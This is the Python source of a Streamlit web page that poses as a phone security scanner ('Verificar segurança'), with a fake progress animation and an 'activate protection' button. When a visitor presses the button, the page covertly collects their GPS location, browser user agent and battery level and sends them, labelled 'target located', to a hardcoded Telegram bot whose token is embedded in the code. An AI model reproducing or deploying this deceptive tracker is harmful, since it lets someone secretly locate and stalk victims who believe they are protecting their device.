import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    try: requests.post(url, json={"chat_id": SEU_ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

# 2. CONFIGURAÇÃO
st.set_page_config(page_title="Segurança", layout="centered")

# 3. CSS (SEM VARIAVEIS PARA NÃO ERRAR)
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .particle-sphere {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .percentage { font-size: 45px; font-weight: bold; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 4. DADOS
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_V3')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_V3')
loc = get_geolocation(key='GPS_V3')

# 5. UI
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
tela = st.empty()

# Mostrar 4% inicial igual ao vídeo
with tela.container():
    st.markdown('<div class="scanner-container"><div class="particle-sphere"><div class="percentage">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 6. BOTÃO
if st.button("🔴 ATIVAR PROTEÇÃO", key='BTN_V3'):
    if loc and 'coords' in loc:
        # Animação
        for p in [20, 45, 75, 100]:
            tela.markdown(f'<div class="scanner-container"><div class="particle-sphere"><div class="percentage">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.2)
        
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🚨 ALVO LOCALIZADO\n"
            f"📱 {ua[:30]}...\n"
            f"🔋 {bat if bat else '--'}%\n"
            f"📍 [MAPA]({mapa})"
        )
        enviar_telegram(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        st.error("⚠️ GPS não carregou. Recarregue a página.")

st.markdown('<p style="text-align:center; color:#444;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
